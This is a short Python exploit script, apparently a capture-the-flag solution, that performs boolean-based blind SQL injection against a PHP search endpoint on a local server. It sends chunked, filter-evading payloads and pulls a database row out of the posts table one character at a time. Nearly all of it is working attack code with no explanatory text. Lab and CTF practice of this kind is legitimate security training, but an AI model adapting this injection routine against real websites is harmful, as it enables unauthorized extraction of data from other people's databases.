import http.client
from urllib.parse import urlencode

def check(condition):
    payload = f"1' AND ({condition})-- -"
    body = urlencode({"search": payload}).encode()

    conn = http.client.HTTPConnection("127.0.0.1", 1337, timeout=10)
    conn.request("POST", "/Controllers/Handlers/SearchHandler.php", body=body,
                 headers={
                     "Content-Type": "application/x-www-form-urlencoded",
                     "Transfer-Encoding": "chunked",
                     "User-Agent": "Mozilla/5.0"
                 }, encode_chunked=True)

    response = conn.getresponse()
    result = response.read().decode(errors="ignore")
    conn.close()

    return "No post id found." in result


query = "(SELECT group_concat(id || ',' || gamename || ',' || gamedesc) FROM posts WHERE id = 6)"
length = 0

for n in range(1, 1000):
    if check(f"length({query}) = {n}"):
        length = n
        break

if not length:
    raise Exception("Không tìm thấy độ dài dữ liệu!")

print(f"[+] Data length: {length}")

data = ""

for pos in range(1, length + 1):
    for code in range(32, 127):
        if check(f"substr({query}, {pos}, 1) = char({code})"):
            data += chr(code)
            print(f"\r[+] Extracting: {data}", end="", flush=True)
            break

print("\n\n[+] Extracted data:", data)

if len(data) >= 6:
    print("[+] Character 6:", data[5])
